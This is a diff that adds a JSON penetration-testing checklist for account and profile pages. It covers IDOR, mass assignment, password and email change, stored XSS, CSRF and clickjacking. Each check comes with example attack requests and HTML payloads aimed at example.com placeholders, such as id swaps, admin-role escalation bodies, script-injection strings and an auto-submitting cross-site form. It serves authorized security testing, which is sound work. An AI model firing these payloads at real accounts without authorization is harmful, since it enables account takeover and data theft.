@@ -1,0 +1,241 @@
+{
+  "schema_version": "1.0.0",
+  "id": "account-profile",
+  "title": "Account / profile page",
+  "summary": "Settings, profile, and account-change: IDOR, mass assignment, stored XSS, password/email change, CSRF, and clickjacking.",
+  "when": {
+    "has_login": [
+      "yes"
+    ]
+  },
+  "also_when": {},
+  "default_for": [],
+  "groups": [
+    {
+      "id": "authz",
+      "title": "Object authorization",
+      "summary": "Swap the id. That is most of profile testing.",
+      "checks": [
+        {
+          "id": "idor-read",
+          "title": "Horizontal read (IDOR)",
+          "item": "WAPT-AUTHZ-003",
+          "related": [
+            "WAPT-API-001",
+            "WAPT-AUTHZ-006"
+          ],
+          "severity": "high",
+          "why": "The handler trusts the user id in the path or query more than the caller.",
+          "validate": "Account A reads account B's profile, email, or settings. Confirm against a fresh authoritative read.",
+          "variants": [
+            {
+              "name": "Swap the path id",
+              "kind": "request",
+              "payload": "GET /users/1002 HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
+              "expect": "1002 belongs to B. Also /profile?id=1002, /api/v1/users/1002, /settings/1002."
+            },
+            {
+              "name": "Numeric walk",
+              "kind": "request",
+              "payload": "GET /api/v1/users/1000 HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>",
+              "expect": "1000, 1001, 1002. A 200 for another account is the finding. Stop after a few hits."
+            },
+            {
+              "name": "Opaque id / UUID",
+              "kind": "request",
+              "payload": "GET /api/v1/users/11111111-1111-1111-1111-111111111111 HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>",
+              "expect": "Guessing is harder; still try B's real UUID captured from an invite, share link, or search."
+            }
+          ]
+        },
+        {
+          "id": "idor-update",
+          "title": "Horizontal update / delete",
+          "item": "WAPT-AUTHZ-004",
+          "related": [
+            "WAPT-AUTHZ-005",
+            "WAPT-API-002"
+          ],
+          "severity": "high",
+          "why": "A can change B's name, email, or delete B.",
+          "validate": "B's object changes after A's request. Confirm with B's session.",
+          "variants": [
+            {
+              "name": "PATCH the other id",
+              "kind": "request",
+              "payload": "PATCH /api/v1/users/1002 HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"name\":\"wapt-marker\"}",
+              "expect": "Read back as B. Also try POST /users/1002/delete and DELETE /users/1002."
+            },
+            {
+              "name": "Body id retarget",
+              "kind": "request",
+              "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"id\":1002,\"email\":\"attacker@example.com\"}",
+              "expect": "Body id must not retarget the update. Also try user_id, account_id, uuid."
+            }
+          ]
+        },
+        {
+          "id": "mass-assign",
+          "title": "Mass assignment on profile",
+          "item": "WAPT-AUTHZ-016",
+          "related": [
+            "WAPT-API-012",
+            "WAPT-AUTHZ-017"
+          ],
+          "severity": "critical",
+          "why": "The binder accepts role, price, owner, or verified flags the UI never sends.",
+          "validate": "An unlisted property is stored and later returned or enforced.",
+          "variants": [
+            {
+              "name": "Hidden privilege fields",
+              "kind": "request",
+              "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <member-token>\nContent-Type: application/json\n\n{\"role\":\"admin\",\"isAdmin\":true,\"verified\":true,\"balance\":9999}",
+              "expect": "Read the object back. role/isAdmin/verified/balance/tenant_id must be unchanged."
+            },
+            {
+              "name": "Ownership reassignment",
+              "kind": "request",
+              "payload": "PATCH /api/v1/projects/55 HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"owner_id\":1002,\"user_id\":1002}",
+              "expect": "Must not move the object to B (or take B's object)."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "change",
+      "title": "Account change and client",
+      "summary": "Password/email change, stored XSS, CSRF, and framing of the settings page.",
+      "checks": [
+        {
+          "id": "password-change",
+          "title": "Password change requires the current secret",
+          "item": "WAPT-AUTH-022",
+          "related": [
+            "WAPT-AUTH-023",
+            "WAPT-AUTH-040"
+          ],
+          "severity": "high",
+          "why": "A stolen session can set a new password without knowing the old one, or the change binds to the wrong account.",
+          "validate": "The password changes without the current secret, or A's request changes B.",
+          "variants": [
+            {
+              "name": "Omit current password",
+              "kind": "request",
+              "payload": "POST /account/password HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>\nContent-Type: application/json\n\n{\"password\":\"NewPass1!\",\"new_password\":\"NewPass1!\"}",
+              "expect": "Must fail. Also try current_password=wrong."
+            },
+            {
+              "name": "Swap target account",
+              "kind": "request",
+              "payload": "POST /account/password HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>\nContent-Type: application/json\n\n{\"user_id\":1002,\"current_password\":\"A-password\",\"new_password\":\"NewPass1!\"}",
+              "expect": "Must change A, not B."
+            }
+          ]
+        },
+        {
+          "id": "email-change",
+          "title": "Email / identity change",
+          "item": "WAPT-AUTH-023",
+          "related": [
+            "WAPT-AUTH-026"
+          ],
+          "severity": "high",
+          "why": "Changing the mailbox without re-auth or without verifying the new address takes the account.",
+          "validate": "The login identifier changes to an address you control without a confirm step.",
+          "variants": [
+            {
+              "name": "Direct email PATCH",
+              "kind": "request",
+              "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"email\":\"attacker@example.com\"}",
+              "expect": "Must stay pending until the new inbox confirms. A silent swap is the finding."
+            },
+            {
+              "name": "Host-poisoned confirm",
+              "kind": "request",
+              "payload": "POST /account/email HTTP/1.1\nHost: www.example.com\nX-Forwarded-Host: evil.example\nCookie: session=<account-A>\nContent-Type: application/json\n\n{\"email\":\"tester@example.com\"}",
+              "expect": "Confirm mail must still point at the canonical origin."
+            }
+          ]
+        },
+        {
+          "id": "stored-xss",
+          "title": "Stored XSS on profile",
+          "item": "WAPT-XSS-002",
+          "related": [
+            "WAPT-XSS-003",
+            "WAPT-XSS-014"
+          ],
+          "severity": "high",
+          "why": "Name, bio, location, or a rich-text field is rendered into HTML for other users or admins.",
+          "validate": "A marker you stored executes in a realistic viewer context.",
+          "variants": [
+            {
+              "name": "HTML in bio",
+              "kind": "request",
+              "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"bio\":\"<img src=x onerror=alert(1)>\",\"name\":\"<svg/onload=alert(1)>\"}",
+              "expect": "View as B and in any admin/moderation queue. Self-XSS alone is not enough."
+            },
+            {
+              "name": "Markdown / rich text",
+              "kind": "request",
+              "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"bio\":\"[ok](javascript:alert(1))\\n<img src=x onerror=alert(1)>\"}",
+              "expect": "Markdown and sanitizer bypasses are the same class. Confirm in the rendered page."
+            }
+          ]
+        },
+        {
+          "id": "csrf-profile",
+          "title": "CSRF on settings",
+          "item": "WAPT-CSRF-002",
+          "related": [
+            "WAPT-CSRF-007",
+            "WAPT-CSRF-010"
+          ],
+          "severity": "high",
+          "why": "A cross-site POST changes email, password, or a notification destination.",
+          "validate": "A cross-origin form changes state in the victim session.",
+          "variants": [
+            {
+              "name": "Cross-site email change",
+              "kind": "html",
+              "payload": "<form action=\"https://www.example.com/account/email\" method=\"POST\">\n  <input name=\"email\" value=\"attacker@example.com\">\n</form>\n<script>document.forms[0].submit()</script>",
+              "expect": "Must fail without a valid CSRF token. SameSite=Lax does not stop POST on some older browsers — still require a token."
+            },
+            {
+              "name": "JSON as text/plain",
+              "kind": "request",
+              "payload": "POST /api/v1/users/me HTTP/1.1\nHost: www.example.com\nContent-Type: text/plain\nOrigin: https://evil.example\nCookie: session=<victim>\n\n{\"email\":\"attacker@example.com\"}",
+              "expect": "Must not change state. This is the classic simple-request CSRF shape."
+            }
+          ]
+        },
+        {
+          "id": "clickjacking-settings",
+          "title": "Clickjacking the settings page",
+          "item": "WAPT-CLIENT-008",
+          "related": [
+            "WAPT-HDR-006"
+          ],
+          "severity": "medium",
+          "why": "A third-party page can frame settings and steal a click on delete, disable MFA, or change email.",
+          "validate": "A cross-origin iframe of /settings either fails to load or there is no sensitive control.",
+          "variants": [
+            {
+              "name": "Read framing headers",
+              "kind": "request",
+              "payload": "GET /settings HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
+              "expect": "Content-Security-Policy: frame-ancestors 'none' (or an explicit allowlist). X-Frame-Options: DENY or SAMEORIGIN."
+            },
+            {
+              "name": "Cross-origin iframe",
+              "kind": "html",
+              "payload": "<!doctype html>\n<title>frame test</title>\n<iframe src=\"https://www.example.com/settings\" style=\"width:100%;height:100%\"></iframe>",
+              "expect": "The iframe stays blank / errors when frame-ancestors or XFO is set. If settings render, framing is allowed."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
